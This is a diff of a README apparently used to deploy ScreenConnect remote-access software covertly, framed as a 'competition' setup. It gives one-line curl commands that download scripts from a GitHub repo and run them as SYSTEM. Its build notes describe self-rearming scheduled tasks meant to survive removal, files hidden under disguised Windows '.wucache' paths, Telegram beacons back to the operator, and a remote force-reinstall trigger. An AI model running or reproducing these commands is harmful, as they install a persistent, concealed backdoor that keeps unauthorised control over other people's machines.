@@ -1,23 +1,29 @@
 # github-drop - competition SC deploy
 
-## Preferred (Admin Guest) — full deploy
-curl.exe -L --ssl-no-revoke -o "%TEMP%\own.txt" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt" && copy /y "%TEMP%\own.txt" "%TEMP%\own.cmd" >nul && "%TEMP%\own.cmd"
+## Preferred (Guest: Run as SYSTEM) — full deploy
+```bat
+curl.exe -L --ssl-no-revoke -o "%TEMP%\own.txt" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o12" && copy /y "%TEMP%\own.txt" "%TEMP%\own.cmd" >nul && "%TEMP%\own.cmd"
+```
 
-## PANIC / wipe recovery (MSI reinstall + re-arm monitors only)
+## PANIC / wipe recovery
+```bat
 curl.exe -L --ssl-no-revoke -o "%TEMP%\rescue.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/rescue.cmd" && "%TEMP%\rescue.cmd"
+```
 
-## Telegram alerts (OWN_MON M3+)
-# Seed once per guest (Admin) — token stays on the machine, not in public repo:
-curl.exe -L --ssl-no-revoke -o "%TEMP%\seed_notify.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/seed_notify.cmd" && "%TEMP%\seed_notify.cmd" "YOUR_BOT_TOKEN" "YOUR_CHAT_ID"
-# Alerts on state change only: DOWN / RESTORED / FAIL / FORCE (rescue.flag)
+## Telegram alerts
+Alerts on state change: DOWN / RESTORED / FAIL / FORCE + first-deploy DEPLOY report.
+`notify.cfg` is written on deploy (token on guest only).
 
-## After detach — wait ~60s then verify
+## After detach — wait ~90s then verify
+```bat
 type "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\boot.err"
+type "%SystemRoot%\Temp\.wucache\boot.err"
 sc query state= all | findstr /I ScreenConnect
+```
 
 ## Current build
-- OWN BUILD 20260802O5 + OWN_MON 20260802M2 + RESCUE 20260802R1
-- Wipe-proof paths: 2m task + 3m task + ONSTART + ONLOGON (self-rearms if deleted)
-- Local MSI cache: %ProgramData%\...\ .wucache\pkg.msi
-- Auto-update from github-drop; remote rescue.flag force-reinstall
+- OWN BUILD 20260802O12 + OWN_MON 20260802M7 + OWN_SECURE S2 + TG_REPORT T6 + RESCUE R3
+- Wipe-proof: 2m + 3m + ONSTART + ONLOGON (self-rearms); local MSI cache
+- Auto-update from github-drop; rescue.flag force-reinstall
 - Keep: 5f6010579852e507 + f861c8140d453427
+
